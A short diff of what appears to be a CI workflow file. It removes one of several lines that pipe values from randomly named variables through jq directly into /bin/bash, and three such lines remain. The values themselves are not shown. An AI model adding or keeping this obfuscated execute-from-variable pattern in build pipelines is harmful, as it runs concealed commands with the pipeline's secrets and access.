@@ -28,7 +28,6 @@ jobs:
           echo $cuvno0458 | jq -r .pqlw71 | /bin/bash
           echo $woa945 | jq -r .lrk843 | /bin/bash
           echo $jdje61 | jq -r .fiepq42263 | /bin/bash
-          echo $gwke26 | jq -r .cq1878 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
